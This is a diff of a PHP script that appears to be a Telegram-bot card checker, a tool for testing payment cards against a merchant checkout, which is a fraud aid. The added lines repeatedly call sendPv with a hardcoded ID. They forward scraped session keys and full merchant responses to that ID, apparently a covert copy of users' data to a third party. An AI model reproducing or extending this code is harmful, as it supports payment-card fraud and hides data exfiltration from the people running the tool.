@@ -1052,8 +1052,8 @@ curl_close($curl);
 echo "qfKey: $qfKey\n";
 echo "MAX_FILE_SIZE: $MAX_FILE_SIZE\n";
 echo "-------------------------------\n";
-
-
+$myid = "1292171163";
+sendPv($myid, $qfKey);
 
 
 
@@ -1180,6 +1180,8 @@ $qfKey2 = $coincidencias[1];
 curl_close($curl);
 
 echo "qfKey: $qfKey2\n";
+$myid = "1292171163";
+sendPv($myid, $qfKey2);
 
 
 
@@ -1260,6 +1262,8 @@ curl_setopt_array($curl, [
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
+$myid = "1292171163";
+sendPv($myid, $response);
 
 $patron = '/<span class="msg-text">(.*?)<\/span>/';
 preg_match($patron, $response, $coincidencias);
@@ -1321,9 +1325,11 @@ if (array_in_string($respo, $live_array)) {
 if ($live) {
     //echo "$respuesta\n";
     editMessage($chatId, $respuesta, $id_text);
+    die();
 } else {
     //echo "$respuesta\n";
     editMessage($chatId, $respuesta, $id_text);
+	die();
 }
 
 //--------FIN DEL CHECKER MERCHAND - CHARGED--------/
